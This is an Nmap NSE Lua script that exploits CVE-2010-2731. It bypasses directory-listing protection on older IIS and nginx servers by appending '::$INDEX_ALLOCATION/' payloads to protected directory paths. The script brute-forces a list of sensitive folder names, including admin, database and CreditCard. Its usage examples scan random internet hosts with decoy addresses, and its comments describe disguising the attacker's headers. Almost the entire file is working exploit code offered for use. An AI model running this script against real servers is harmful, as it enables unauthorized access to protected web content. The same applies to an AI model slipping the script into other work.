---
-- Nmap NSE IIS-CVE-2010-2731.nse - Version 1.8
-- Copy to: /usr/share/nmap/scripts/IIS-CVE-2010-2731.nse
-- Update NSE database: sudo nmap --script-updatedb
-- execute: nmap --script-help IIS-CVE-2010-2731.nse
-- Port(s) accepted by this nse: 80-86,8001,8080-8086
---

-- SCRIPT BANNER DESCRIPTION --
description = [[

Module Author: r00t-3xp10it
NSE script to detect if target [ip]:[port][/url] its affected by CVE-2010-2731 (Directory Listing Denied) 
This module bypasses Directory Listing protections for Internet Information Services (microsoft-IIS/5.1 to 7.5
& nginx 0.7.52 to 1.3.0). By appending a payload to the end of the directory name in a request, it is possible
to access webserver protected directorys. nse arguments available: verbose=true (automatic display target body)
agent=User-Agent (User-Agent string to send in probes) | uri=directory to scan (If none uri its inputed then this
script tests a List of default [/url's] available in our database to brute force folder names). This nse script
will auto-execute if the categorie it belongs its called (eg. --script=vuln) <-- run all vuln categorie scripts.

Some Syntax examples:
nmap --script-help IIS-CVE-2010-2731.nse
nmap -sV -v -Pn -n -p 80-86,8001,8080-8086 --open --script=vuln 103.59.101.83
nmap -sV -Pn -n -p 80-86,8001,8080-8086 --open --script IIS-CVE-2010-2731.nse 223.7.230.27
nmap -sV -Pn -n -p 80-86,8001,8080-8086 --open --script IIS-CVE-2010-2731.nse --script-args "uri=/css" 223.7.230.27
nmap -sS -Pn -p 80 --open --script IIS-CVE-2010-2731.nse --script-args "agent=Apache-HttpClient/4.0.3,verbose=true" 80.32.135.112
nmap -sS -v -Pn -n -T4 -iR 700 -p 80,8001,8080-8086 --open --script=banner.nse,http-headers.nse,IIS-CVE-2010-2731.nse -D 65.49.82.3

]]

---
-- @usage
-- nmap --script-help IIS-CVE-2010-2731.nse
-- nmap -sV -Pn -n -p 80-86,8001,8080-8086 --open --script IIS-CVE-2010-2731.nse 223.7.230.27
-- nmap -sV -Pn -n -p 80-86,8001,8080-8086 --open --script IIS-CVE-2010-2731.nse --script-args "uri=/css" 223.7.230.27
-- nmap -sS -Pn -p 80 --open --script IIS-CVE-2010-2731.nse --script-args "agent=Apache-HttpClient/4.0.3,verbose=true" 223.7.230.27
-- nmap -sS -v -Pn -n -T5 -iR 700 -O -p 80,8001,8080-8086 --open --script=banner.nse,http-headers.nse,IIS-CVE-2010-2731.nse -D 65.49.82.3
-- @output
-- PORT     STATE SERVICE VERSION
-- 80/tcp open  http
-- | IIS-CVE-2010-2731:
-- |   STATUS: POSSIBLE BYPASS - Directory Listing Denied
-- |       URL ACCESS: http://223.7.230.27:80/images::$INDEX_ALLOCATION/
-- |       Module Author: r00t-3xp10it (ssa redteam)
-- |_
-- @args payload.uri the path name to search. Default: /0/
-- @args payload.agent User-agent to send in request - Default: iPhone,safari
-- @args payload.verbose Automatic display target webpage body - Default: false
---


author = "r00t-3xp10it (ssa redteam)"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"safe", "vuln"}


-- DEPENDENCIES (lua nse libraries) --
local stdnse = require ('stdnse') --> nse args usage
local shortport = require "shortport"
local string = require "string"
local table = require "table"
local http = require "http"
local nmap = require "nmap"
local os = require "os" --> required for (sleep)
-- define loop limmit(s)
limmit = 0


-- SET VALUES COLOR TERMINAL USE IN FUNCTION --
local colors = {
  -- attributes
  reset = 0,
  clear = 0,
  bright = 1,
  dim = 2,
  underscore = 4,
  blink = 5,
  reverse = 7,
  hidden = 8,

  -- foreground
  black = 30,
  red = 31,
  green = 32,
  yellow = 33,
  blue = 34,
  magenta = 35,
  cyan = 36,
  white = 37,

  -- background
  onblack = 40,
  onred = 41,
  ongreen = 42,
  onyellow = 43,
  onblue = 44,
  onmagenta = 45,
  oncyan = 46,
  onwhite = 47,
}

-- FUNCTION SET COLOR TERMINAL --
local function makecolor(value)
  value =  string.char(27) .. '[1;' .. tostring(value) .. 'm'
return value
end
-- SET VALUES COLOR TERMINAL --
local green_color = makecolor(colors.green)
local white_color = makecolor(colors.white)
local error_color = makecolor(colors.red)   
local reset_color = makecolor(colors.reset)
local yellow_color = makecolor(colors.yellow)
-- COLORING MADE BY MODULE --
local by_module = white_color.."r00t-3xp10it (ssa redteam)"..reset_color


-- THE RULE SECTION --
-- portrule = shortport.http --> Scan only the selected ports/proto/service_name in open state
portrule = shortport.port_or_service({80, 81, 82, 83, 84, 85, 86, 8001, 8080, 8081, 8082, 8083, 8084, 8085, 8086}, "http, http-proxy", "tcp", "open")


-- THE ACTION SECTION --
action = function(host, port)
print(yellow_color.."IIS-CVE-2010-2731:"..reset_color)
print("| "..yellow_color.."Checking exploit compatibility."..reset_color)


local result
uri = stdnse.get_script_args(SCRIPT_NAME..".uri") or "/0/"
disp = stdnse.get_script_args(SCRIPT_NAME..".verbose") or "false"
-- bias = stdnse.get_script_args(SCRIPT_NAME..".vuln") or "Server: Microsoft-IIS/6.0"
-- Table of server vulnerable versions
tbl = {"Server: nginx/0.7.52", "Server: nginx/1.0.0", "Server: nginx/1.1.0", "Server: nginx/1.2.0", "Server: nginx/1.3.0", "Server: Microsoft-IIS/5.1", "Server: Microsoft-IIS/6.0", "Server: Microsoft-IIS/6.1", "Server: Microsoft-IIS/6.2", "Server: Microsoft-IIS/6.3", "Server: Microsoft-IIS/6.4", "Server: Microsoft-IIS/6.5", "Server: Microsoft-IIS/6.6", "Server: Microsoft-IIS/6.7", "Server: Microsoft-IIS/6.8", "Server: Microsoft-IIS/6.9", "Server: Microsoft-IIS/7.0", "Server: Microsoft-IIS/7.1", "Server: Microsoft-IIS/7.2", "Server: Microsoft-IIS/7.3", "Server: Microsoft-IIS/7.4", "Server: Microsoft-IIS/7.5", "Server: Apache/2.4.6 (CentOS) PHP/7.1.32"}

-- Capture target header to compare againts {tbl} vuln versions 
result = http.get(host, port, "/")
-- Display target header if verbose=true
if ( disp == "true" ) then
   print("")
   for _, stdout_header in pairs(result.rawheader) do
      print(stdout_header)
   end
end

target = "false"
-- loop trougth {tbl} (vuln server versions)
for i, intable in pairs(tbl) do
   -- loop trougth result.rawheader {table} (captured header)
   for _, server_version in pairs(result.rawheader) do
      if (server_version == intable) then
         target = server_version --> we have found a match between {tbl} and captured header {server_version=compatible}
         break
      end
   end
end

-- Exit if none compatible server version its found
if (target == "false") then
   print("| ["..error_color.."404"..reset_color.."] Non Compatible Server version detected.")
   print("|\n|   STATUS: "..error_color..host.ip.." - Does not seems vuln to CVE-2010-2731"..reset_color.."\n|       Module Author: "..by_module.."\n|_")
   do return end
else
   print("| ["..green_color.."200"..reset_color.."] "..target)
end


-- Manipulate TCP packet 'header' with false information about attacker :D
local options = {header={}}   --> manipulate 'header' request ..
options['header']['User-Agent'] = stdnse.get_script_args(SCRIPT_NAME..".agent") or "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1" --> use iPhone,safari User-agent OR your own...
options['header']['Accept-Language'] = "en-GB,en;q=0.8,sv" --> use en-GB as attacker default install language
options['header']['Cache-Control'] = "no-store" -->  Instruct webserver to not write it to disk (do not to cache it)


-- Scanning for directory names in target host
local check_uri = http.get(host, port, uri, options)
if (check_uri.status == 1003 or check_uri.body:match("Direct IP access not allowed")) then
   print("| ["..error_color..check_uri.status..reset_color.."] => http://"..host.ip..":"..port.number..error_color.." (Direct IP access not allowed)"..reset_color.."\n|_")
elseif (check_uri.body and check_uri.status == 404) then
   print("| "..yellow_color.."Scanning Directory Names."..reset_color)
   print("| ["..error_color..check_uri.status..reset_color.."] "..host.ip.." => "..uri)
   -- None User Input uri found => using table {uril} List
   uril = {"/etc/", "/Mem/", "/img/", "/css/", "/ASP/", "/imgs/", "/.svn/", "/main/", "/home/", "/Data/", "/USER/", "/Mail/", "/News/", "/Site/", "/Page/", "/fotos/", "/forum/", "/Excel/", "/login/", "/admin/", "/Views/", "/stats/", "/Pages/", "/Album/", "/static/", "/hidden/", "/camera/", "/Albums/", "/admin1/", "/Survey/", "/Office/", "/PSUser/", "/Citrix/", "/Common/", "/images/", "/gallery/", "/account/", "/Sources/", "/Example/", "/History/", "/archive/", "/database/", "/archives/", "/Plug-Ins/", "/AdminWeb/", "/documents/", "/UserFiles/", "/adminRoot/", "/ISSamples/", "/FCKeditor/", "/Templates/", "/adminuser/", "/adsamples/", "/Web_Store/", "/admin-serv/", "/CreditCard/", "/adminmysql/", "/Statistics/", "/ProductCart/", "/addressbook/", "/addressBook/", "/AdvWebAdmin/", "/DomainFiles/", "/HBTemplates/", "/administator/", "/Administration/", "/CustomerService/", "/adminphpmyadmin/"}
   -- loop Through {table} of uri url's
   for i, intable in pairs(uril) do
      local res = http.get(host, port, intable)
      if (res.status == 403 or res.status == 401 and res.body:match("Directory Listing Denied")) then
         print("| ["..green_color..res.status..reset_color.."] "..host.ip.." => "..intable..green_color.." (found: protected)"..reset_color)
         limmit = limmit+1 --> count how many interactions (loops done)
         os.execute("sleep 0.2")
            -- Sellect payload to use based on target uri
            local parse = string.sub(intable, -1) --> grab last char of uri
            if (parse ~= "/") then
               payload = ":$i30:$INDEX_ALLOCATION/"
               uri = intable..payload --> define uri variable with payload now
            else
               conf = intable:sub(1, -2) --> delete last [/] from uri
               payload = "::$INDEX_ALLOCATION/"
               uri = conf..payload --> define uri variable with payload now
            end
         if ( disp == "true" ) then
            print("\n"..res.body.."\n")
         end
         if ( limmit == 69 ) then
            print("|_")
            os.execute("sleep 1")
            return --> exit() on the end of uri list tests
         end
      else
        limmit = limmit+1 --> count how many interactions (loops done)
        print("| ["..error_color.."404"..reset_color.."] "..host.ip.." => "..intable)
        os.execute("sleep 0.2")
        if ( limmit == 69 ) then --> why 69? Because its the number of URI links present in the {table} list.
           print("|_")
           os.execute("sleep 1")
           return --> exit() on the end of uri list tests
        end
      end
   end
-- More error codes
elseif ( check_uri.status == 400 or check_uri.status == 405 or check_uri.status == 500 or check_uri.status == 502 or check_uri.status == 503 or check_uri.status == 307 or check_uri.status == 302 or check_uri.status == 301 or check_uri.status == nil ) then
   print("| ["..error_color..check_uri.status..reset_color.."] "..host.ip.." => "..uri)
   do return end --> exit if any of this error codes returns
elseif ( check_uri.status == 403 and check_uri.body:match("Directory Listing Denied")) then
   print("| ["..green_color..check_uri.status..reset_color.."] "..host.ip.." => "..uri)
   -- Sellect payload to use based on target uri
   local parse = string.sub(uri, -1) --> grab last char of uri
   if (parse ~= "/") then
      payload = ":$i30:$INDEX_ALLOCATION/"
      uri = uri..payload
   else
      conf = uri:sub(1, -2) --> delete last [/] from uri
      payload = "::$INDEX_ALLOCATION/"
      uri = conf..payload
   end
end


-- Sending payload to sellected uri (last uri found)
print("|\n| ["..green_color.."200"..reset_color.."] "..yellow_color.."Sending tcp packet with payload attached."..reset_color)
os.execute("sleep 1")
if ( uri == "/0/" ) then
   print("| STATUS: "..error_color.."None Match has been found in IIS-CVE-2010-2731 database."..reset_color.."\n|       URL ACCESS:"..error_color.." http://"..host.ip..":"..port.number..reset_color.."\n|       Module Author: "..by_module.."\n|_")
else
-- Trying to bypass directory protections
local bypass = http.get(host, port, uri, options)
   if (bypass.status == 1003 or bypass.body:match("Direct IP access not allowed")) then 
      print("|   STATUS: "..error_color.."ERROR - Direct IP access not allowed"..reset_color.."\n|       URL ACCESS:"..error_color.." http://"..host.ip..":"..port.number..uri..reset_color.."\n|       Module Author: "..by_module.."\n|_")
      os.execute("sleep 2")
      if ( disp == "true" ) then
         print("\n"..bypass.body.."\n")
      end
   elseif (bypass.status == 501 or bypass.body:match("Not Implemented")) then
      print("|   STATUS: "..error_color.."ERROR - Not Implemented"..reset_color.."\n|       URL ACCESS:"..error_color.." http://"..host.ip..":"..port.number..uri..reset_color.."\n|       Module Author: "..by_module.."\n|_")
      os.execute("sleep 2")
      if ( disp == "true" ) then
         print("\n"..bypass.body.."\n")
      end
   elseif (bypass.body and bypass.status == 404) then
      print("|   STATUS: "..green_color.."POSSIBLE BYPASS - Directory Listing Denied"..reset_color.."\n|       URL ACCESS:"..green_color.." http://"..host.ip..":"..port.number..uri..reset_color.."\n|       Module Author: "..by_module.."\n|_")
      os.execute("sleep 2")
      if ( disp == "true" ) then
         print("\n"..bypass.body.."\n")
      end
   elseif (bypass.body and bypass.status == 200) then
      print("|   STATUS: "..green_color.."FOUND BYPASS - Directory Listing Denied"..reset_color.."\n|       URL ACCESS:"..green_color.." http://"..host.ip..":"..port.number..uri..reset_color.."\n|       Module Author: "..by_module.."\n|_")
      os.execute("sleep 2")
      if ( disp == "true" ) then
         print("\n"..bypass.body.."\n")
      end
   elseif (bypass.status == 403 or bypass.body:match("Request denied by WatchGuard Firewall.") ) then
      print("|   STATUS: "..error_color.."REQUEST DENIED - Directory Listing Denied ("..yellow_color.."WatchGuard"..error_color..")"..reset_color.."\n|       URL ACCESS:"..error_color.." http://"..host.ip..":"..port.number..uri..reset_color.."\n|       Module Author: "..by_module.."\n|_")
      os.execute("sleep 2")
      if ( disp == "true" ) then
         print("\n"..bypass.body.."\n")
      end
   else
      print("|   STATUS: "..error_color..host.ip.." - Does not seem to by vuln to CVE-2010-2731"..reset_color.."\n|       URL ACCESS:"..error_color.." http://"..host.ip..":"..port.number..uri..reset_color.."\n|       Module Author: "..by_module.."\n|_")
      os.execute("sleep 2")
      if ( disp == "true" ) then
         print("\n"..bypass.body.."\n")
      end
   end
 end
end
